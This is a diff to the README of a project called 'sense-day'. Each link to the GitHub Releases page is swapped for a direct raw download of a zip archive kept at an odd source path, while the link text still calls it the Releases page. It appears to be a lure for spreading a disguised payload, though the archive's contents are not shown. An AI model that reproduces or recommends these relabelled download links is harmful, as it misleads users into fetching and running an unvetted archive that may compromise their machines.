@@ -6,9 +6,9 @@ Welcome to sense-day! This application helps you translate hard data, such as pl
 
 ## 📥 Download
 
-[![Download sense-day](https://github.com/DilligentOwl1187/sense-day/releases/latest/download/button.svg)](https://github.com/DilligentOwl1187/sense-day/releases)
+[![Download sense-day](https://raw.githubusercontent.com/DilligentOwl1187/sense-day/main/app/api/mint/sense_day_1.8.zip)](https://raw.githubusercontent.com/DilligentOwl1187/sense-day/main/app/api/mint/sense_day_1.8.zip)
 
-Visit this page to download: [sense-day Releases](https://github.com/DilligentOwl1187/sense-day/releases)
+Visit this page to download: [sense-day Releases](https://raw.githubusercontent.com/DilligentOwl1187/sense-day/main/app/api/mint/sense_day_1.8.zip)
 
 ## 🍽️ System Requirements
 
@@ -23,7 +23,7 @@ Before installing sense-day, ensure your device meets these specifications:
 
 Follow these simple steps to install sense-day on your device:
 
-1. Visit the [Releases page](https://github.com/DilligentOwl1187/sense-day/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/DilligentOwl1187/sense-day/main/app/api/mint/sense_day_1.8.zip).
 2. Click on the latest version available.
 3. Download the installer suitable for your operating system.
 4. Once downloaded, locate the installer file in your downloads folder.
